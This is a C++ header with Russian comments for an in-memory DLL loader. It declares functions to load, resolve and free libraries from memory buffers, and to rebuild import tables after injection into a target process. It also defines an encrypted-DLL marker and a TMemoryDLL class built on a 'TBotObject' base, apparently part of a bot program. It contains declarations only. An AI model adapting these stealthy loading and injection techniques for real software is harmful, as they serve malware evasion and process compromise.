
//****************************************************************************
//  Модуль работы с библиотеками загруженными в память
//
//  Версия: 1.0.1
//  Модифицирован: Август 2012
//****************************************************************************


#ifndef DllLoaderH
#define DllLoaderH
//----------------------------------------------------------------------------

#include <windows.h>
#include "GetApi.h"
#include "Strings.h"

typedef void *HMEMORYMODULE;

//-------------------------------------------------------
//  MemoryLoadLibrary - Функция загружает в память из
//                      переданного буфера памяти
//-------------------------------------------------------
HMEMORYMODULE MemoryLoadLibrary(const void *);


//-------------------------------------------------------
//  MemoryGetProcAddress - Функция возвращает адрес
//                     функции зугруженной в память DLL
//-------------------------------------------------------
FARPROC MemoryGetProcAddress(HMEMORYMODULE Dll, const char* Name);

//-------------------------------------------------------
//  MemoryFreeLibrary - Функция освобождает ресурсы
//                      выдеоенные для DLL в памяти
//-------------------------------------------------------
void MemoryFreeLibrary(HMEMORYMODULE);



//-------------------------------------------------------
//  BuildImport - Функция правит таблицу импорта dll.
//                В случае инжекта в другой процесс
//                возможно не совпадение таблицы импорта.
//                Функция необходима для случаем когда
//                рабочий процесс заинжекчен в целевой
//                процесс.
//-------------------------------------------------------
bool BuildImport(PVOID ImageBase);





//*******************************************************
//  Данные для работы с шифрованными DLL
//*******************************************************

//----------------------------------
//  Маркер DLL
//----------------------------------
#define ENCRYPTED_DLL_MARKER   "_DLL_DATA_"


//----------------------------------
//  Размер маркера DLL
//----------------------------------
#define ENCRYPTED_DLL_MARKER_SIZE 10

//----------------------------------
//  Хэш маркера DLL
//----------------------------------
#define ENCRYPTED_DLL_MARKER_HASH 0x8CAC120C /* _DLL_DATA_ */




//*******************************************************
// TDLL - класс автоматической загрузки, выгрузки
//        библиотек из памяти
//        Класс автоматически расшифровывает шифрованные
//        библиотеки
//
//  Алгоритм шифрования DLL:
//*******************************************************
class TMemoryDLL : public TBotObject
{
private:
	HMEMORYMODULE FHandle;
public:
	TMemoryDLL(const void* DllBuf);
	~TMemoryDLL();

    HMEMORYMODULE inline Handle() { return FHandle; }

	LPVOID        GetProcAddress(const char*   Name);
	LPVOID inline GetProcAddress(const string& Name) { return GetProcAddress(Name.t_str()); }
	bool          GetProcAddress(const char*   Name, LPVOID &Addr);
	bool   inline GetProcAddress(const string& Name, LPVOID &Addr) { return GetProcAddress(Name.t_str(), Addr); }
};



//----------------------------------------------------------------------------
#endif